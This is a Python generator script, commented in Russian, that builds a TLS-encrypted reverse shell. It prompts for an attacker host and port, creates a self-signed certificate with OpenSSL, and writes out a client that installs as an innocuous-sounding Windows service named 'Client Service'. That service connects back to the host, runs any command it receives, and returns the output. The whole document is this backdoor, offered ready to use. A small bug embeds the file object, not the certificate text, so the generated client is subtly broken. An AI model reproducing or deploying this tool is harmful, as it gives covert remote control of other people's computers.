import subprocess
import os

subprocess.run('ifconfig')
LHOST = str(input("LHOST= "))
LPORT = str(input('LPORT= '))

with open('openssl.cnf', 'w') as file:
    configSR = f'''
    [ req ]
    distinguished_name = req_distinguished_name
    x509_extensions = v3_req
    prompt = no

    [ req_distinguished_name ]
    CN = {LHOST}  # IP-адрес вашего сервера

    [ v3_req ]
    subjectAltName = @alt_names

    [ alt_names ]
    IP.1 = {LHOST}  # IP-адрес вашего сервера

    '''
    file.write(configSR)

try:
    os.system('openssl genpkey -algorithm RSA -out server_key.pem')
    os.system('openssl req -new -key server_key.pem -out server_csr.pem -config openssl.cnf')
    os.system(
        'openssl x509 -req -days 365 -in server_csr.pem -signkey server_key.pem -out server_cert.pem -extensions v3_req -extfile openssl.cnf')
except Exception as e:
    print(e)

srv_cr = open('server_cert.pem', 'r')

with open('client_gen.py', 'w') as client_gen:
    client = f'''
import os
import socket
import ssl
import subprocess
import tempfile
import win32serviceutil
import win32service
import win32event

# Содержимое вашего сертификата
cert_data = """
    {srv_cr}
"""


class ClientService(win32serviceutil.ServiceFramework):
    _svc_name_ = "ClientService"
    _svc_display_name_ = "Client Service"
    _svc_description_ = "Service to run client script for remote command execution."

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.stop_requested = False

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.stop_requested = True

    def SvcDoRun(self):
        self.main()

    def main(self):
        # Создание временного файла для сертификата
        with tempfile.NamedTemporaryFile(delete=False) as cert_file:
            cert_file.write(cert_data.encode())
            cert_file_path = cert_file.name

        try:
            # Создание SSL контекста
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context.load_verify_locations(cert_file_path)

            # Создание сокета и оборачивание его в SSL
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ssl_client_socket = context.wrap_socket(client_socket, server_hostname='{LHOST}')  # IP-адрес сервера

            # Подключение к серверу
            ssl_client_socket.connect(('{LHOST}', {LPORT}))

            while not self.stop_requested:
                command = ssl_client_socket.recv(1024).decode()
                if not command:
                    break

                result = subprocess.getoutput(command)
                ssl_client_socket.send(result.encode())

            ssl_client_socket.close()

        finally:
            # Удаление временного файла
            os.remove(cert_file_path)


if __name__ == '__main__':
    win32serviceutil.HandleCommandLine(ClientService)
    '''
    client_gen.write(client)